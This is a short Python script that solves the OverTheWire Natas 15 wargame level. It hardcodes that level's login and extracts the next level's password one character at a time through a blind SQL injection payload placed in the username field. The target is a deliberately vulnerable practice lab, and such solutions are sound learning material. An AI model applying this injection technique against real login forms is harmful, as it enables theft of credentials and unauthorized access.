#!/usr/bin/env python

import requests
import re
import urllib
import base64
from string import *

characters = lowercase + uppercase + digits
#print characters

username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

#headers = { "Referer" : "http://natas5.natas.labs.overthewire.org/"}

#cookies = { "loggedin" : "1"}

url = 'http://%s.natas.labs.overthewire.org/' %username

#response = requests.get(url, auth = (username, password))
session = requests.Session()

seen_password = list()
while ( True ):
		for ch in characters:
			print "trying character with password", "".join(seen_password) + ch
			response = requests.post(url, data = { "username" : 'natas16" AND BINARY password LIKE "' + "".join(seen_password) + ch + '%" # ' }, auth = (username, password))
			content = response.text

			if ('user exist' in content):
				seen_password.append(ch)
				print "current password is ", ch
				break

			#print content
 
#print re.findall('The password for natas15 is (.*)<br>', content)[0]